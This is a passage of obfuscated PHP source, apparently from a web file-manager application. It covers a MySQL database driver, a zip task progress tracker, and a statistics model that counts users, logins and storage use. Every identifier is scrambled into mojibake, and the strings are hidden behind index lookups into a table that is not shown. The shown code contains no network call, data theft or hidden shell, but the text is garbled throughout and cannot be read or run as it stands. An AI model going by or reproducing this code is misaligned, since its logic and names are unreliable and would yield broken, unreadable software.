$this->linkID[$‘ü½†­Ò]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¦Ï—ıÁ¬) { $âÛªö·ë =& $_SERVER[øşô´çË]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦Ï—ıÁ¬; if ($this->queryID) { $this->free(); } think_action_status($âÛªö·ë[33], 1); think_status($âÛªö·ë[34]); $this->queryID = $this->_linkID->query($¦Ï—ıÁ¬); if ($this->_linkID->more_results()) { while (($—ÓÌßŒ = $this->_linkID->next_result()) != NULL) { $—ÓÌßŒ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ê±‘™Ã) { $Íœë×´Å =& $_SERVER[øşô´çË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ê±‘™Ã; if ($this->queryID) { $this->free(); } think_action_status($Íœë×´Å[35], 1); think_status($Íœë×´Å[34]); $½êÉå…ê = $this->_linkID->query($Ê±‘™Ã); $this->debug(); if (!1 === $½êÉå…ê) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $“§¹ø® = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$“§¹ø®) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $€×®Şı = $this->_linkID->rollback(); $this->transTimes = 0; if (!$€×®Şı) { $this->error(); return !1; } } return !0; } private function getAll() { $½Šğ‹ÂÄ = array(); if ($this->numRows > 0) { for ($ÆùæñÚ¦ = 0; $ÆùæñÚ¦ < $this->numRows; $ÆùæñÚ¦++) { $½Šğ‹ÂÄ[$ÆùæñÚ¦] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $½Šğ‹ÂÄ; } public function getFields($Àê·åÂÌ) { $ÙÔ“éÍ¦ =& $_SERVER[øşô´çË]; $Ûªª½ñÀ = $this->query($ÙÔ“éÍ¦[1055] . $this->parseKey($Àê·åÂÌ)); $Â—ÍÎ = array(); if ($Ûªª½ñÀ) { foreach ($Ûªª½ñÀ as $üã €– => $ÁÉÊ²Ø”) { $Â—ÍÎ[$ÁÉÊ²Ø”[$ÙÔ“éÍ¦[41]]] = array($ÙÔ“éÍ¦[42] => $ÁÉÊ²Ø”[$ÙÔ“éÍ¦[41]], $ÙÔ“éÍ¦[43] => $ÁÉÊ²Ø”[$ÙÔ“éÍ¦[44]], $ÙÔ“éÍ¦[45] => (bool) ($ÁÉÊ²Ø”[$ÙÔ“éÍ¦[46]] === $ÙÔ“éÍ¦[12]), $ÙÔ“éÍ¦[47] => $ÁÉÊ²Ø”[$ÙÔ“éÍ¦[48]], $ÙÔ“éÍ¦[49] => strtolower($ÁÉÊ²Ø”[$ÙÔ“éÍ¦[50]]) == $ÙÔ“éÍ¦[51], $ÙÔ“éÍ¦[52] => strtolower($ÁÉÊ²Ø”[$ÙÔ“éÍ¦[53]]) == $ÙÔ“éÍ¦[54]); } } return $Â—ÍÎ; } public function getTables($¾õ¡§à = '') { $ô¢ÎæÇ¹ =& $_SERVER[øşô´çË]; $ÁãÒãá = !empty($¾õ¡§à) ? $ô¢ÎæÇ¹[1057] . $¾õ¡§à . $ô¢ÎæÇ¹[1058] : $ô¢ÎæÇ¹[1059]; $®ÈÏ„Æ† = $this->query($ÁãÒãá); $³öïÏ±È = array(); if ($®ÈÏ„Æ†) { foreach ($®ÈÏ„Æ† as $®Àûöö => $¹Ò¬ƒ²) { $³öïÏ±È[$®Àûöö] = current($¹Ò¬ƒ²); } } return $³öïÏ±È; } public function replace($«´¯ç©…, $¢À‚ï–† = array()) { $’ƒ¶¤ò÷ =& $_SERVER[øşô´çË]; foreach ($«´¯ç©… as $áÔ‘äÃ => $»ƒ™ÑÂé) { $Â¯Çø¡ = $this->parseValue($»ƒ™ÑÂé); if (is_scalar($Â¯Çø¡)) { $™ş«ºóÛ[] = $Â¯Çø¡; $ü²„Ğóç[] = $this->parseKey($áÔ‘äÃ); } } $¿Œ‘Û  = $’ƒ¶¤ò÷[1060] . $this->parseTable($¢À‚ï–†[$’ƒ¶¤ò÷[366]]) . $’ƒ¶¤ò÷[1061] . implode($’ƒ¶¤ò÷[60], $ü²„Ğóç) . $’ƒ¶¤ò÷[1062] . implode($’ƒ¶¤ò÷[60], $™ş«ºóÛ) . $’ƒ¶¤ò÷[1063]; return $this->execute($¿Œ‘Û ); } public function insertAll($òÉÄÖğ•, $‡À‡¾Äç = array(), $áÖƒ§Û = false) { $åÓ²×” =& $_SERVER[øşô´çË]; if (!is_array($òÉÄÖğ•[0])) { return !1; } $·í²á¦ = array_keys($òÉÄÖğ•[0]); $ÙõåàÎ = array(); foreach ($òÉÄÖğ• as $ÓÈßÆè®) { $ˆ‘‚§Á = array(); foreach ($ÓÈßÆè® as $¹õÒõ¿Ó => $¾™š­å—) { $¾™š­å— = $this->parseValue($¾™š­å—); if (is_scalar($¾™š­å—)) { $ˆ‘‚§Á[] = $¾™š­å—; } } $ÙõåàÎ[] = $åÓ²×”[346] . implode($åÓ²×”[60], $ˆ‘‚§Á) . $åÓ²×”[1063]; } array_walk($·í²á¦, array($this, $åÓ²×”[1064])); $·şãğª = $áÖƒ§Û ? $åÓ²×”[1065] : $åÓ²×”[1066]; $·şãğª = $åÓ²×”[1066]; $ÏóñÈÈ± = $·şãğª . $åÓ²×”[1067] . $this->parseTable($‡À‡¾Äç[$åÓ²×”[366]]) . $åÓ²×”[1061] . implode($åÓ²×”[60], $·í²á¦) . $åÓ²×”[1068] . implode($åÓ²×”[60], $ÙõåàÎ); if ($áÖƒ§Û) { $—ü×³Ûî = array(); foreach ($·í²á¦ as $¹õÒõ¿Ó) { if ($¹õÒõ¿Ó == $åÓ²×”[241] || $¹õÒõ¿Ó == $åÓ²×”[1069]) { continue; } $—ü×³Ûî[] = $¹õÒõ¿Ó . $åÓ²×”[1070] . $¹õÒõ¿Ó . $åÓ²×”[1063]; } $ÏóñÈÈ± .= $åÓ²×”[1071] . implode($åÓ²×”[60], $—ü×³Ûî); } return $this->execute($ÏóñÈÈ±); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $„…ÔêÏ¢ =& $_SERVER[øşô´çË]; $this->error = $this->_linkID->errno . $„…ÔêÏ¢[4] . $this->_linkID->error; if ($„…ÔêÏ¢[12] != $this->queryStr) { $this->error .= LNG($„…ÔêÏ¢[58]) . $this->queryStr; } think_trace($this->error, $„…ÔêÏ¢[12], $„…ÔêÏ¢[59]); return $this->error; } public function escapeString($™½Ğ«à§) { if ($this->_linkID) { return $this->_linkID->real_escape_string($™½Ğ«à§); } else { return addslashes($™½Ğ«à§); } } public function parseKey(&$Ïµƒ‘Äæ, $Ò¬·êâŒ = true) { $¿›Ú¦ô‘ =& $_SERVER[øşô´çË]; if ($Ò¬·êâŒ) { $Ïµƒ‘Äæ = $this->parseKeyCheck($Ïµƒ‘Äæ); } if ($Ïµƒ‘Äæ != $¿›Ú¦ô‘[230] && !preg_match($¿›Ú¦ô‘[1072], $Ïµƒ‘Äæ)) { $Ïµƒ‘Äæ = $¿›Ú¦ô‘[484] . trim($Ïµƒ‘Äæ, $¿›Ú¦ô‘[484]) . $¿›Ú¦ô‘[484]; } return $Ïµƒ‘Äæ; } } goto D¶Œõ¨÷ÛÖ; CËÕœƒ ©Á: define($_SERVER[øşô´çË][326], 3); define($_SERVER[øşô´çË][327], 1); define($_SERVER[øşô´çË][328], 0); goto cáµ¯î†¢æ; BÛ±¸ìî£: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ü¹¢ ¸ =& $_SERVER[øşô´çË]; parent::startAfter(); Hook::bind($ü¹¢ ¸[2107], array($this, $ü¹¢ ¸[2097])); Hook::bind($ü¹¢ ¸[2099], array($this, $ü¹¢ ¸[2100])); $ûøÎ´¤ˆ =& $this->task; $ûøÎ´¤ˆ[$ü¹¢ ¸[2101]] = $ü¹¢ ¸[1381]; if (!$ûøÎ´¤ˆ[$ü¹¢ ¸[1862]]) { $ûøÎ´¤ˆ[$ü¹¢ ¸[1862]] = LNG($ü¹¢ ¸[2108]); } } protected function endAfter() { $¹óŸ°Ÿù =& $_SERVER[øşô´çË]; parent::endAfter(); Hook::unbind($¹óŸ°Ÿù[2107], array($this, $¹óŸ°Ÿù[2097])); Hook::unbind($¹óŸ°Ÿù[2099], array($this, $¹óŸ°Ÿù[2100])); } public function updateAfter() { $Äáºóß¥ =& $_SERVER[øşô´çË]; $æç…ÓŠ =& $this->task; if (!$æç…ÓŠ[$Äáºóß¥[1228]] || !$æç…ÓŠ[$Äáºóß¥[866]]) { return; } if ($æç…ÓŠ[$Äáºóß¥[2101]] == $Äáºóß¥[1381]) { $ç«ÏÂ•Ë = $æç…ÓŠ[$Äáºóß¥[2027]]; if ($æç…ÓŠ[$Äáºóß¥[2028]] != $Äáºóß¥[1381]) { $ç«ÏÂ•Ë = 0; } $½¨­¨ = ($æç…ÓŠ[$Äáºóß¥[943]] + $ç«ÏÂ•Ë) / $æç…ÓŠ[$Äáºóß¥[866]]; $æç…ÓŠ[$Äáºóß¥[1974]] = $½¨­¨ * 0.3; } else { if ($æç…ÓŠ[$Äáºóß¥[2101]] == $Äáºóß¥[397]) { $½¨­¨ = $æç…ÓŠ[$Äáºóß¥[1973]] / $æç…ÓŠ[$Äáºóß¥[1228]]; $æç…ÓŠ[$Äáºóß¥[1974]] = 0.3 + $½¨­¨ * 0.5; } else { if ($æç…ÓŠ[$Äáºóß¥[2101]] == $Äáºóß¥[117]) { $½¨­¨ = 0; if ($æç…ÓŠ[$Äáºóß¥[2026]]) { $½¨­¨ = $æç…ÓŠ[$Äáºóß¥[2027]] / $æç…ÓŠ[$Äáºóß¥[2026]]; } $æç…ÓŠ[$Äáºóß¥[1974]] = 0.3 + 0.5 + $½¨­¨ * 0.2; } } } if ($æç…ÓŠ[$Äáºóß¥[1974]] > 0) { $·íö™›É = timeFloat() - $æç…ÓŠ[$Äáºóß¥[1976]] - $æç…ÓŠ[$Äáºóß¥[1979]]; $æç…ÓŠ[$Äáºóß¥[1980]] = $·íö™›É * (1 - $æç…ÓŠ[$Äáºóß¥[1974]]) / $æç…ÓŠ[$Äáºóß¥[1974]]; } } public function copyFileStart($±ß´ÄÀ¹, $‹ÜÉîïÆ, $€©ºö¶², $„æ ƒ’ú, $Èä¶Àá, $§ÀÙãş) { $æ®ÒÁ­¼ =& $_SERVER[øşô´çË]; parent::copyFileStart($±ß´ÄÀ¹, $‹ÜÉîïÆ, $€©ºö¶², $„æ ƒ’ú, $Èä¶Àá, $§ÀÙãş); $ÃÏÄü =& $this->task; if ($ÃÏÄü[$æ®ÒÁ­¼[2101]] == $æ®ÒÁ­¼[397]) { $ÃÏÄü[$æ®ÒÁ­¼[2101]] = $æ®ÒÁ­¼[117]; } $this->update(); } public function copyFileEnd($î‘£ö†–, $à²ñÑÁ», $ÆáÎÕÒ, $¼¡ˆ¨¤º, $ÍîÛ¯í, $Š¿ø¦ïË) { $ã©¤ØùÓ =& $_SERVER[øşô´çË]; $­ˆÍ¨·Ö =& $this->task; $­ˆÍ¨·Ö[$ã©¤ØùÓ[2027]] = $­ˆÍ¨·Ö[$ã©¤ØùÓ[2026]]; $­ˆÍ¨·Ö[$ã©¤ØùÓ[943]] += $­ˆÍ¨·Ö[$ã©¤ØùÓ[2026]]; $­ˆÍ¨·Ö[$ã©¤ØùÓ[2028]] = $ã©¤ØùÓ[12]; $this->update(); } public function zipEvent($Ú¢æÕÍ, $øù¨ÃÇÑ, $÷«¸¢‘, $Ò×¿Ó„Ø) { $õÑ„øÑ‘ =& $_SERVER[øşô´çË]; $ÒúìÍıê =& $this->task; $ÒúìÍıê[$õÑ„øÑ‘[2024]] = get_path_this($øù¨ÃÇÑ); $ÒúìÍıê[$õÑ„øÑ‘[2026]] = $Ò×¿Ó„Ø; $ÒúìÍıê[$õÑ„øÑ‘[2027]] = $÷«¸¢‘; $ÒúìÍıê[$õÑ„øÑ‘[1230]] = $Ú¢æÕÍ == $õÑ„øÑ‘[2109] ? $õÑ„øÑ‘[2104] : $õÑ„øÑ‘[2105]; $ÒúìÍıê[$õÑ„øÑ‘[2028]] = $õÑ„øÑ‘[12]; $ÒúìÍıê[$õÑ„øÑ‘[866]] = $Ò×¿Ó„Ø; $ÒúìÍıê[$õÑ„øÑ‘[2101]] = $õÑ„øÑ‘[397]; $this->update(); } public function nameParse($”èöóô’) { $‚˜òíÌ± =& $_SERVER[øşô´çË]; $ÍÈƒ¢´¶ =& $this->task; if ($ÍÈƒ¢´¶[$‚˜òíÌ±[1973]] < $ÍÈƒ¢´¶[$‚˜òíÌ±[1228]]) { $ØêŒ÷Ó— = get_path_this($”èöóô’); if (strstr($ØêŒ÷Ó—, $‚˜òíÌ±[10])) { $ÍÈƒ¢´¶[$‚˜òíÌ±[1973]] += 1; } } if ($ÍÈƒ¢´¶[$‚˜òíÌ±[2101]] == $‚˜òíÌ±[1381]) { $ÍÈƒ¢´¶[$‚˜òíÌ±[2101]] = $‚˜òíÌ±[397]; } $ÍÈƒ¢´¶[$‚˜òíÌ±[2024]] = $”èöóô’; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ñ§íÂ€µ) { $–‹½òÇë =& $_SERVER[øşô´çË]; $«èÖ®Šè = array($–‹½òÇë[693] => array($–‹½òÇë[43] => $–‹½òÇë[2110], $–‹½òÇë[360] => array($–‹½òÇë[292], $–‹½òÇë[868], $–‹½òÇë[2111], $–‹½òÇë[2112])), $–‹½òÇë[2113] => array($–‹½òÇë[43] => $–‹½òÇë[2114], $–‹½òÇë[360] => array($–‹½òÇë[292], $–‹½òÇë[866], $–‹½òÇë[2115], $–‹½òÇë[2116], $–‹½òÇë[2117]))); if (!isset($«èÖ®Šè[$ñ§íÂ€µ])) { return !1; } $this->optionType = $«èÖ®Šè[$ñ§íÂ€µ][$–‹½òÇë[43]]; $this->field = $«èÖ®Šè[$ñ§íÂ€µ][$–‹½òÇë[360]]; return !0; } public function listData($»ÛÔ‚Õ¾ = false, $±ÈÜüÁ‹ = "\x6d\157\x64\151\146\x79\x54\151\x6d\x65", $¤êŞ±ğƒ = false) { return parent::listData($»ÛÔ‚Õ¾, $±ÈÜüÁ‹, $¤êŞ±ğƒ); } public function trendList($²Ü“Â„Æ) { $èœÅ¬¥Ä =& $_SERVER[øşô´çË]; $¬˜°ãÉ¾ = $this->listData(); if ($¬˜°ãÉ¾) { $ªĞ¦õâ— = end($¬˜°ãÉ¾); $şÒá˜Ê = date($èœÅ¬¥Ä[2118], strtotime($èœÅ¬¥Ä[2119])); if ($ªĞ¦õâ—[$èœÅ¬¥Ä[292]] == $şÒá˜Ê) { return $¬˜°ãÉ¾; } $ßÙ½çó = strtotime($ªĞ¦õâ—[$èœÅ¬¥Ä[292]]); } if (!isset($ßÙ½çó)) { $ï¿´ÚÑı = $²Ü“Â„Æ == $èœÅ¬¥Ä[693] ? $èœÅ¬¥Ä[626] : $èœÅ¬¥Ä[935]; $ßÙ½çó = Model($ï¿´ÚÑı)->min($èœÅ¬¥Ä[241]); } $‹Œ²ÀÂÜ = $èœÅ¬¥Ä[2120] . ucfirst($²Ü“Â„Æ); $ü•Ñä‰§ = $this->dateList($ßÙ½çó); foreach ($ü•Ñä‰§ as $şÒá˜Ê) { $this->{$‹Œ²ÀÂÜ}($şÒá˜Ê); } return $this->listData(); } private function dateList($äØËÄ÷) { $¼Úâ·¼İ =& $_SERVER[øşô´çË]; $ì·òıµÚ = $äØËÄ÷; $ÀéÃ°Ô = strtotime($¼Úâ·¼İ[2119]); $šáÔ½¬… = array(); while ($ì·òıµÚ <= $ÀéÃ°Ô) { $šáÔ½¬…[] = date($¼Úâ·¼İ[2118], $ì·òıµÚ); $ì·òıµÚ = strtotime($¼Úâ·¼İ[2121], $ì·òıµÚ); } return $šáÔ½¬…; } public function _recordUser($èãÙÎ… = '') { $‹ĞöŠ„Û =& $_SERVER[øşô´çË]; if (!$èãÙÎ…) { return 0; } $£›ËŒ­‘ = strtotime(date($‹ĞöŠ„Û[2122], strtotime($èãÙÎ…))); $…Á„ê—· = strtotime(date($‹ĞöŠ„Û[2123], strtotime($èãÙÎ…))); $‹é…‚… = array($‹ĞöŠ„Û[241] => array($‹ĞöŠ„Û[1177], $…Á„ê—·)); $‰§ÀĞÖ = Model($‹ĞöŠ„Û[626])->where($‹é…‚…)->count($‹ĞöŠ„Û[1588]); $‹é…‚…[$‹ĞöŠ„Û[241]] = array($‹ĞöŠ„Û[417], array($£›ËŒ­‘, $…Á„ê—·)); $Œß‡ºÕ¾ = Model($‹ĞöŠ„Û[626])->where($‹é…‚…)->count($‹ĞöŠ„Û[1588]); $‹é…‚…[$‹ĞöŠ„Û[43]] = $‹ĞöŠ„Û[2124]; $šâû°»Ä = Model($‹ĞöŠ„Û[2125])->where($‹é…‚…)->count($‹ĞöŠ„Û[2126]); $÷øÛûëÂ = array($‹ĞöŠ„Û[292] => $èãÙÎ…, $‹ĞöŠ„Û[868] => (int) $‰§ÀĞÖ, $‹ĞöŠ„Û[2111] => (int) $Œß‡ºÕ¾, $‹ĞöŠ„Û[2112] => (int) $šâû°»Ä); return $this->insert($÷øÛûëÂ); } public function _recordStore($ä¯Ú¦È‚ = '') { $µæÕ÷¾ =& $_SERVER[øşô´çË]; if (!$ä¯Ú¦È‚) { return 0; } $ÊÇòÖªç = strtotime(date($µæÕ÷¾[2123], strtotime($ä¯Ú¦È‚))); $‹·½Ê¯ = array($µæÕ÷¾[241] => array($µæÕ÷¾[1177], $ÊÇòÖªç)); $á‰€„·’ = Model($µæÕ÷¾[569])->where($‹·½Ê¯)->sum($µæÕ÷¾[89]); $ÄÕ×âêê = "\123\x45\x4c\105\103\124\x20\12\x20\40\40\x20\40\x20\40\x20\40\x20\x20\40\x20\x20\40\40\x53\125\115\x28\x60\163\x69\x7a\145\140\51\x20\x41\x53\x20\x73\151\x7a\x65\x54\x6f\164\141\154\54\12\x20\40\x20\40\x20\40\40\x20\x20\40\40\40\x20\x20\40\x20\x53\125\115\50\x43\x41\123\x45\40\127\110\x45\x4e\x20\x60\164\141\162\x67\x65\x74\124\171\x70\x65\140\40\75\40\61\40\x54\x48\105\x4e\x20\x60\x73\151\x7a\145\x60\40\105\114\x53\x45\40\x30\x20\105\x4e\x44\x29\x20\101\123\40\163\x69\x7a\145\125\163\x65\162\54\12\x20\40\x20\x20\40\x20\40\x20\40\40\x20\x20\x20\40\x20\x20\123\125\115\x28\x43\x41\x53\105\x20\127\110\105\x4e\x20\140\x74\141\x72\147\145\164\124\171\160\145\140\x20\75\x20\x32\x20\x54\x48\105\x4e\40\x60\163\x69\x7a\x65\x60\x20\x45\x4c\123\105\x20\60\x20\x45\x4e\x44\51\40\x41\123\40\x73\151\172\145\x47\162\157\x75\x70\xa\40\40\40\40\40\40\40\40\x20\x20\x20\x20\40\x20\x20\40\106\122\x4f\115\40\140\x69\157\137\x73\157\x75\x72\x63\x65\140\x20\xa\x20\x20\x20\x20\x20\x20\40\40\40\40\40\x20\x20\x20\x20\40\x57\x48\x45\x52\x45\40\x60\151\x73\x46\157\x6c\x64\145\162\140\x20\75\x20\x30\x20\101\116\x44\x20\x60\x63\x72\x65\x61\x74\x65\x54\151\155\x65\x60\40\x3c\x3d\x20{$ÊÇòÖªç}"; $’›’ö×¹ = Model($µæÕ÷¾[935])->query($ÄÕ×âêê); $ş‡Ü©ú÷ = array($µæÕ÷¾[292] => $ä¯Ú¦È‚, $µæÕ÷¾[866] => (int) (isset($’›’ö×¹[0][$µæÕ÷¾[866]]) ? $’›’ö×¹[0][$µæÕ÷¾[866]] : 0), $µæÕ÷¾[2115] => (int) $á‰€„·’, $µæÕ÷¾[2116] => (int) (isset($’›’ö×¹[0][$µæÕ÷¾[2116]]) ? $’›’ö×¹[0][$µæÕ÷¾[2116]] : 0), $µæÕ÷¾[2117] => (int) (isset($’›’ö×¹[0][$µæÕ÷¾[2117]]) ? $’›’ö×¹[0][$µæÕ÷¾[2117]] : 0)); return $this->insert($ş‡Ü©ú÷); } public function trend($ş‰ÀÁŞ, $»õ÷”™Ï) { $æÉÕÉşô =& $_SERVER[øşô´çË]; if (!$this->init($ş‰ÀÁŞ)) { return !1; } $•ö÷÷šŒ = $this->trendList($ş‰ÀÁŞ); if ($•ö÷÷šŒ && $»õ÷”™Ï != $æÉÕÉşô[1946]) { $¹Šííïç = $•ö÷÷šŒ[0][$æÉÕÉşô[292]]; $›¨ªò¦È = $this->validDate($»õ÷”™Ï, $¹Šííïç); $ïÆê‘·Ÿ = array(); $ô¶ä‘úÓ = array_to_keyvalue($•ö÷÷šŒ, $æÉÕÉşô[292]); foreach ($›¨ªò¦È as $‘‘š®œï) { if (isset($ô¶ä‘úÓ[$‘‘š®œï])) { $§»İ‚¹¨ = $ô¶ä‘úÓ[$‘‘š®œï]; } else { $§»İ‚¹¨ = end($•ö÷÷šŒ); $§»İ‚¹¨[$æÉÕÉşô[292]] = $‘‘š®œï; if ($ş‰ÀÁŞ == $æÉÕÉşô[693]) { $§»İ‚¹¨[$æÉÕÉşô[2111]] = $§»İ‚¹¨[$æÉÕÉşô[2112]] = 0; } } $ïÆê‘·Ÿ[] = $§»İ‚¹¨; } $•ö÷÷šŒ = $ïÆê‘·Ÿ; } $Íö×€Ë¬ = array($æÉÕÉşô[693] => array($æÉÕÉşô[868] => LNG($æÉÕÉşô[2127]), $æÉÕÉşô[2111] => LNG($æÉÕÉşô[2128]), $æÉÕÉşô[2112] => LNG($æÉÕÉşô[2129])), $æÉÕÉşô[2113] => array($æÉÕÉşô[866] => LNG($æÉÕÉşô[2130]), $æÉÕÉşô[2115] => LNG($æÉÕÉşô[2131]), $æÉÕÉşô[2116] => LNG($æÉÕÉşô[2132]), $æÉÕÉşô[2117] => LNG($æÉÕÉşô[2133]))); $§¥ëåì = array($æÉÕÉşô[693] => $æÉÕÉşô[952], $æÉÕÉşô[2113] => $æÉÕÉşô[89]); if (empty($•ö÷÷šŒ)) { $‘‘š®œï = date($æÉÕÉşô[2118], strtotime($æÉÕÉşô[2119])); $Ş³´óô = array($æÉÕÉşô[292] => $‘‘š®œï); foreach ($Íö×€Ë¬[$ş‰ÀÁŞ] as $ÏàüÕŠ => $¼ˆ¯±ù) { $Ş³´óô[$ÏàüÕŠ] = 0; } $•ö÷÷šŒ[] = $Ş³´óô; } $ÇŸ³ò–‚ = array(); foreach ($•ö÷÷šŒ as $¼ˆ¯±ù) { if ($ş‰ÀÁŞ == $æÉÕÉşô[2113] && $¼ˆ¯±ù[$æÉÕÉşô[2115]] > $¼ˆ¯±ù[$æÉÕÉşô[866]]) { $¼ˆ¯±ù[$æÉÕÉşô[2115]] = $¼ˆ¯±ù[$æÉÕÉşô[866]]; } foreach ($Íö×€Ë¬[$ş‰ÀÁŞ] as $ÏàüÕŠ => $Ñ‡ãæ) { $§»İ‚¹¨ = array($æÉÕÉşô[292] => $¼ˆ¯±ù[$æÉÕÉşô[292]], $æÉÕÉşô[1862] => $Ñ‡ãæ); $§»İ‚¹¨[$§¥ëåì[$ş‰ÀÁŞ]] = isset($¼ˆ¯±ù[$ÏàüÕŠ]) ? $¼ˆ¯±ù[$ÏàüÕŠ] : 0; $ÇŸ³ò–‚[] = $§»İ‚¹¨; } } return $ÇŸ³ò–‚; } public function validDate($ ü–‡…Ğ, $Š¤ÉÁ§×) { $åÈÜÛ˜» =& $_SERVER[øşô´çË]; $óÂÒëˆ = date($åÈÜÛ˜»[2118], strtotime($åÈÜÛ˜»[2119])); $³—®¼šş = array($óÂÒëˆ); switch ($ ü–‡…Ğ) { case $åÈÜÛ˜»[1953]: $¸ØÛ¥şÛ = mktime(0, 0, 0, date($åÈÜÛ˜»[2134]), date($åÈÜÛ˜»[1655]) - date($åÈÜÛ˜»[1741]) + 7 - 7, date($åÈÜÛ˜»[2135])); $¿£‰°Êç = 0; do { $ò‹Äá¶™ = date($åÈÜÛ˜»[2118], $¸ØÛ¥şÛ - 3600 * 24 * 7 * $¿£‰°Êç); $³—®¼šş[] = $ò‹Äá¶™; $¿£‰°Êç++; } while ($Š¤ÉÁ§× < $ò‹Äá¶™); break; case $åÈÜÛ˜»[1951]: $¿£‰°Êç = 1; do { $ù¦–”÷² = date($åÈÜÛ˜»[2136], strtotime("\x2d\x20{$¿£‰°Êç}\40\155\x6f\x6e\164\x68\x73")); $³—®¼šş[] = $ù¦–”÷²; $¿£‰°Êç++; } while ($Š¤ÉÁ§× < $ù¦–”÷²); break; case $åÈÜÛ˜»[2137]: $Æö¢®âŞ = (int) date($åÈÜÛ˜»[2135], strtotime($Š¤ÉÁ§×)); $ùßêĞÓ = (int) date($åÈÜÛ˜»[2135]); if ($Æö¢®âŞ >= $ùßêĞÓ) { break; } for ($Æö¢®âŞ; $Æö¢®âŞ < $ùßêĞÓ; $Æö¢®âŞ++) { $³—®¼šş[] = $Æö¢®âŞ . $åÈÜÛ˜»[2138]; } break; default: break; } if ($Š¤ÉÁ§× > end($³—®¼šş)) { array_pop($³—®¼šş); } sort($³—®¼šş); return $³—®¼šş; } public function listTable($ñØ”…«À) { $ùßŸò¯Ã = ucfirst($ñØ”…«À); return Model($ùßŸò¯Ã)->listData(); } public function option($•¦ñ ¯…) { return call_user_func_array(array($this, $_SERVER[øşô´çË][2139] . ucfirst($•¦ñ ¯…)), array()); } private function optionUser() { $ï¿šİ¾ =& $_SERVER[øşô´çË]; $·ÈÄÃõ = Model($ï¿šİ¾[626])->count($ï¿šİ¾[1588]); $€ÎşŸƒ„ = Model($ï¿šİ¾[626])->where($ï¿šİ¾[2140])->count($ï¿šİ¾[1588]); $Êéˆ‡ª = intval($GLOBALS[$ï¿šİ¾[6]][$ï¿šİ¾[433]][$ï¿šİ¾[1920]]) / 3600; $÷—¥´Ïñ = strtotime("\x2d{$Êéˆ‡ª}\40\150\x6f\165\162\163"); $Î„¸éì  = strtotime(date($ï¿šİ¾[2122])); if ($÷—¥´Ïñ < $Î„¸éì ) { $÷—¥´Ïñ = $Î„¸éì ; } $…İÍ€Ì² = array($ï¿šİ¾[2141] => array($ï¿šİ¾[1178], $÷—¥´Ïñ)); $ÕÛì¯ôç = (int) Model($ï¿šİ¾[626])->where($…İÍ€Ì²)->count($ï¿šİ¾[1588]); if (!$ÕÛì¯ôç) { $ÕÛì¯ôç = 1; } $…İÍ€Ì² = array($ï¿šİ¾[2141] => array($ï¿šİ¾[1178], $Î„¸éì )); $½íÂ¸ÉÓ = Model($ï¿šİ¾[626])->where($…İÍ€Ì²)->count($ï¿šİ¾[1588]); return array($ï¿šİ¾[861] => (int) $·ÈÄÃõ, $ï¿šİ¾[2142] => (int) ($·ÈÄÃõ - $€ÎşŸƒ„), $ï¿šİ¾[2143] => (int) $€ÎşŸƒ„, $ï¿šİ¾[2144] => (int) $½íÂ¸ÉÓ, $ï¿šİ¾[2145] => $ÕÛì¯ôç); } private function optionFile() { $ş×¯¾Ö =& $_SERVER[øşô´çË]; $Œè÷ø´ = $this->sourceSize(); $¤¦î¥­î = array($ş×¯¾Ö[509] => 0); $§ùÁå©ñ = Model($ş×¯¾Ö[935])->where($¤¦î¥­î)->count(); $¤¦î¥­î[$ş×¯¾Ö[241]] = array($ş×¯¾Ö[1178], strtotime(date($ş×¯¾Ö[2122]))); $“®ş“ï = Model($ş×¯¾Ö[935])->where($¤¦î¥­î)->field(array($ş×¯¾Ö[951] => $ş×¯¾Ö[952], $ş×¯¾Ö[953] => $ş×¯¾Ö[89]))->find(); $Ã¹Òüş° = array($ş×¯¾Ö[866] => $Œè÷ø´[$ş×¯¾Ö[89]], $ş×¯¾Ö[2115] => $Œè÷ø´[$ş×¯¾Ö[2115]], $ş×¯¾Ö[2146] => $Œè÷ø´[$ş×¯¾Ö[89]] - $Œè÷ø´[$ş×¯¾Ö[2115]], $ş×¯¾Ö[2147] => (int) (isset($“®ş“ï[$ş×¯¾Ö[89]]) ? $“®ş“ï[$ş×¯¾Ö[89]] : 0), $ş×¯¾Ö[868] => (int) $§ùÁå©ñ, $ş×¯¾Ö[2148] => (int) (isset($“®ş“ï[$ş×¯¾Ö[952]]) ? $“®ş“ï[$ş×¯¾Ö[952]] : 0)); if ($Ã¹Òüş°[$ş×¯¾Ö[2146]] < 0) { $Ã¹Òüş°[$ş×¯¾Ö[2146]] = 0; } return $Ã¹Òüş°; } private function optionAccess() { $±ÓÈÄ‘İ =& $_SERVER[øşô´çË]; return array($±ÓÈÄ‘İ[861] => $this->typeLogCnt(), $±ÓÈÄ‘İ[117] => $this->typeLogCnt($±ÓÈÄ‘İ[117]), $±ÓÈÄ‘İ[548] => $this->typeLogCnt($±ÓÈÄ‘İ[548]), $±ÓÈÄ‘İ[1330] => $this->typeLogCnt($±ÓÈÄ‘İ[1330]), $±ÓÈÄ‘İ[1557] => $this->typeLogCnt($±ÓÈÄ‘İ[1557]), $±ÓÈÄ‘İ[693] => $this->typeLogCnt($±ÓÈÄ‘İ[12], $±ÓÈÄ‘İ[2126])); } private function typeLogCnt($é¹İ…ú¯ = '', $øò¿°à„ = "\x69\144") { $ß€Å˜Øª =& $_SERVER[øşô´çË]; $ü €ıÆÀ = array($ß€Å˜Øª[117] => array($ß€Å˜Øª[2149], $ß€Å˜Øª[2150]), $ß€Å˜Øª[548] => array($ß€Å˜Øª[2151], $ß€Å˜Øª[2152]), $ß€Å˜Øª[1330] => 